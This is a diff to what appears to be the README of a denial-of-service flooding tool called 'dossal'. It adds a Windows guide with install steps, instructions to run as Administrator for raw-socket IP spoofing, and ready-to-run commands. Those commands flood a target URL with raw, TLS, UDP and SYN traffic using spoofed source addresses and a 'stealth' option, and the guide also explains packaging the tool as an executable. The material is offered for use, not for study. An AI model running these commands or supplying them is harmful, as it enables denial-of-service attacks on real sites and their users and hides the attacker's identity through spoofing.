@@ -295,6 +295,25 @@ http, https, httpsmp, raw, h2, h2mp, grpc, grpcmp, quic, udp, tcp, syn, synack, 
 - Commands: start/stop/status/shutdown
 - UDP control channel, real-time status reporting
 
+### Windows Guide
+
+1. **Install Python 3.10+** from python.org
+2. **Install dependencies**: `pip install h2 hpack websockets grpcio`
+3. **Run as Administrator** (required for raw socket spoofing):
+   ```
+   # GUI (one-click)
+   python dossal_gui.py
+   
+   # CLI (max power)
+   python dossal.py --mode raw --url http://target.com --duration 60 --threads 16 --spoof 100 --stealth --recovery
+   
+   # One-click combo (TLS + UDP + SYN)
+   python dossal.py --combo tls --url https://target.com --duration 60 --threads 16
+   ```
+4. **Build EXE**: `pyinstaller --onefile --windowed --name dossal dossal_gui.py`
+
+**Windows IP Spoofing**: Administrator + raw socket + IP_HDRINCL = true source IP spoofing (1M+ IPs)
+
 ### Performance (30-core M2 Max)
 | Mode | Perf |
 |---|---|
